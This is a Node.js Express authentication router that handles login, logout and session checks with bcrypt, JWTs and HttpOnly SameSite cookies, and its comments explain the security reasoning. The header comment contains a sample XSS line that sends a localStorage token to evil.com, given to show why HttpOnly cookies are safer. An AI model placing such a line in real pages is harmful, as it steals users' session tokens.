/**
 * referral-api/routes/auth.js
 * ----------------------------
 * Authentication router — handles login, logout, and session check.
 *
 * Endpoints:
 *   POST /api/auth/login  — Validate credentials, issue an HttpOnly JWT cookie.
 *   POST /api/auth/logout — Clear the JWT cookie.
 *   GET  /api/auth/me     — Return the logged-in user's basic info from the cookie.
 *
 * Security model:
 *   - Passwords are NEVER stored or compared in plaintext. bcrypt.compare()
 *     hashes the incoming password and compares it to the stored hash.
 *   - The JWT is sent ONLY as an HttpOnly, SameSite=Strict cookie. It is
 *     NEVER returned in the JSON body, preventing JavaScript from reading it
 *     (XSS mitigation). See the security note below for a full explanation.
 *   - SameSite=Strict blocks the cookie from being sent on cross-site requests
 *     (CSRF mitigation — the browser simply will not attach the cookie).
 *   - In production set `secure: true` so the cookie is only sent over HTTPS.
 *
 * WHY HttpOnly cookies beat localStorage for tokens:
 *   localStorage is readable by ANY JavaScript on your page. If an attacker
 *   injects a <script> tag (XSS), they can do:
 *     fetch('https://evil.com?t=' + localStorage.getItem('token'))
 *   and steal the token permanently. HttpOnly cookies are completely invisible
 *   to JavaScript — document.cookie and fetch() cannot read them. The browser
 *   attaches them automatically on each request, but no script can exfiltrate them.
 */

'use strict';

const express = require('express');
const bcrypt  = require('bcrypt');
const jwt     = require('jsonwebtoken');
const pool    = require('../db');

const router = express.Router();

// ---------------------------------------------------------------------------
// POST /api/auth/login
//
// Request body (JSON):
//   { "username": "admin", "password": "admin123" }
//
// Success response — 200 OK:
//   { "message": "Login successful", "user": { "id": 1, "username": "admin", "role": "ADMIN" } }
//   Cookie set: token=<JWT>; HttpOnly; SameSite=Strict; Path=/
//
// Error responses:
//   400 Bad Request  — username or password missing
//   401 Unauthorized — user not found, or password does not match
//   500 Server Error — unexpected DB or JWT failure
// ---------------------------------------------------------------------------
router.post('/login', async (req, res, next) => {
  // ── Step 1: Extract and validate inputs ────────────────────────────────────
  const username = req.body.username?.trim();
  const password = req.body.password; // Do NOT trim passwords — whitespace may be intentional.

  if (!username || !password) {
    return res.status(400).json({
      error: 'username and password are required.',
      code:  'MISSING_FIELDS',
    });
  }

  try {
    // ── Step 2: Look up the user by username ──────────────────────────────────
    //
    // We retrieve the password_hash so we can compare it below.
    // The idx_users_username index makes this lookup fast.
    // Parameterised query — no SQL injection risk.
    const result = await pool.query(
      'SELECT id, username, password_hash, role, agent_id FROM users WHERE username = $1',
      [username]
    );

    // ── Step 3: Guard — user not found ───────────────────────────────────────
    //
    // IMPORTANT: we use the SAME generic error message for both "user not found"
    // and "wrong password". This prevents username enumeration attacks, where an
    // attacker probes for valid usernames by distinguishing the two responses.
    if (result.rows.length === 0) {
      return res.status(401).json({
        error: 'Invalid username or password.',
        code:  'INVALID_CREDENTIALS',
      });
    }

    const user = result.rows[0];

    // ── Step 4: Compare the submitted password against the stored bcrypt hash ─
    //
    // bcrypt.compare() does NOT require us to hash the incoming password first.
    // Internally it:
    //   1. Extracts the salt embedded in the stored hash.
    //   2. Hashes the incoming plaintext with that same salt.
    //   3. Does a constant-time comparison of the two hashes.
    //
    // The constant-time comparison prevents timing attacks where an attacker
    // could tell if a password was "closer" to correct based on response time.
    const passwordMatch = await bcrypt.compare(password, user.password_hash);

    if (!passwordMatch) {
      // Same generic message — do not leak which field was wrong.
      return res.status(401).json({
        error: 'Invalid username or password.',
        code:  'INVALID_CREDENTIALS',
      });
    }

    // ── Step 5: Generate the JWT ──────────────────────────────────────────────
    //
    // PAYLOAD: We include only the minimum claims needed for authorisation.
    //   - id       : used by GET /api/auth/me to identify the user.
    //   - role     : used by authorizeRole() middleware to check permissions.
    //   - agent_id : used by GET /api/agents/:id/stats to restrict agent access.
    //
    // We do NOT include password_hash, email, or any sensitive data in the payload.
    // JWT payloads are base64-encoded, NOT encrypted — anyone who decodes them
    // can read the claims. Only the SIGNATURE is secret.
    //
    // expiresIn: '8h' — a working day's worth of session. The token is
    // automatically invalid after this without any server-side state.
    const payload = {
      id:       user.id,
      role:     user.role,
      agent_id: user.agent_id, // null for ADMIN users
    };

    const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '8h' });

    // ── Step 6: Send the token as an HttpOnly cookie ──────────────────────────
    //
    // httpOnly: true  — JavaScript (e.g., document.cookie, fetch) CANNOT read
    //                   this cookie. Only the browser's HTTP layer handles it.
    //                   This is the primary XSS defence.
    //
    // sameSite: 'Strict' — The browser WILL NOT attach this cookie to any
    //                   cross-site request (e.g., a request triggered from
    //                   evil.com that targets our API). CSRF mitigation.
    //
    // secure: false (dev) / true (prod) — In production, set to true so the
    //                   cookie is only ever transmitted over an encrypted HTTPS
    //                   connection. Never send tokens over plain HTTP in prod.
    //
    // maxAge: 8h in ms  — Tells the browser to persist the cookie for 8 hours.
    //                   Without maxAge, the cookie is a "session cookie" and
    //                   disappears when the browser tab closes.
    res.cookie('token', token, {
      httpOnly: true,
      sameSite: 'Strict',
      secure:   process.env.NODE_ENV === 'production',
      maxAge:   8 * 60 * 60 * 1000, // 8 hours in milliseconds
      path:     '/',
    });

    // ── Step 7: Return user info (NO token in the body) ───────────────────────
    //
    // The frontend uses this to know who is logged in immediately after login,
    // without making a separate /api/auth/me call.
    // We deliberately EXCLUDE password_hash and the token from this response.
    return res.status(200).json({
      message: 'Login successful.',
      user: {
        id:       user.id,
        username: user.username,
        role:     user.role,
      },
    });

  } catch (err) {
    console.error('[POST /api/auth/login] Error:', err.message);
    next(err);
  }
});


// ---------------------------------------------------------------------------
// GET /api/auth/me
// Reads the JWT from the HttpOnly cookie and returns the logged-in user's info.
//
// This endpoint is called by the frontend on every page load/refresh to
// determine if the session is still valid (the cookie exists and has not expired).
// Because the cookie is HttpOnly, JavaScript cannot directly inspect it —
// this endpoint acts as the bridge.
//
// Success response — 200 OK:
//   { "id": 1, "username": "admin", "role": "ADMIN" }
//
// Error responses:
//   401 Unauthorized — cookie is missing, token is expired, or signature is invalid
//   500 Server Error — unexpected DB failure
// ---------------------------------------------------------------------------
router.get('/me', async (req, res, next) => {
  // ── Step 1: Read the token from the cookie ────────────────────────────────
  //
  // req.cookies is populated by the cookie-parser middleware (configured in
  // index.js). Because the cookie is HttpOnly, it was NEVER accessible from
  // client-side JavaScript — only the browser sends it automatically here.
  const token = req.cookies?.token;

  if (!token) {
    return res.status(401).json({
      error: 'Not authenticated. Please log in.',
      code:  'NO_TOKEN',
    });
  }

  try {
    // ── Step 2: Verify the token's signature and expiry ───────────────────────
    //
    // jwt.verify() does three things:
    //   1. Decodes the base64 header and payload.
    //   2. Recomputes the HMAC-SHA256 signature using JWT_SECRET and compares
    //      it to the signature in the token. Rejects if they differ (tampered).
    //   3. Checks the 'exp' claim — rejects if the token has expired.
    //
    // If verification fails for any reason, it throws a JsonWebTokenError or
    // TokenExpiredError, which we catch below.
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // ── Step 3: Fetch fresh user info from the DB ─────────────────────────────
    //
    // We do NOT blindly trust all claims in the JWT payload (e.g., username).
    // Instead we use the verified `id` to look up the current username from the DB.
    // This ensures that if an admin changed a user's username after login,
    // /api/auth/me reflects the updated value.
    const result = await pool.query(
      'SELECT id, username, role FROM users WHERE id = $1',
      [decoded.id]
    );

    if (result.rows.length === 0) {
      // The user was deleted after the token was issued.
      return res.status(401).json({
        error: 'User account no longer exists.',
        code:  'USER_NOT_FOUND',
      });
    }

    const user = result.rows[0];

    return res.status(200).json({
      id:       user.id,
      username: user.username,
      role:     user.role,
    });

  } catch (err) {
    // JsonWebTokenError  — bad signature (tampered token)
    // TokenExpiredError  — token's exp claim is in the past
    // Both are expected auth failures, not 500 errors.
    if (err.name === 'JsonWebTokenError' || err.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: 'Session expired or invalid. Please log in again.',
        code:  'INVALID_TOKEN',
      });
    }

    console.error('[GET /api/auth/me] Unexpected error:', err.message);
    next(err);
  }
});


// ---------------------------------------------------------------------------
// POST /api/auth/logout
// Clears the JWT cookie by overwriting it with an expired one.
//
// Since the cookie is HttpOnly, JavaScript cannot delete it directly.
// We use res.clearCookie() (which sets maxAge=0) to instruct the browser
// to delete it immediately.
//
// Success response — 200 OK:
//   { "message": "Logged out successfully." }
// ---------------------------------------------------------------------------
router.post('/logout', (req, res) => {
  res.clearCookie('token', {
    httpOnly: true,
    sameSite: 'Strict',
    secure:   process.env.NODE_ENV === 'production',
    path:     '/',
  });

  return res.status(200).json({ message: 'Logged out successfully.' });
});


module.exports = router;
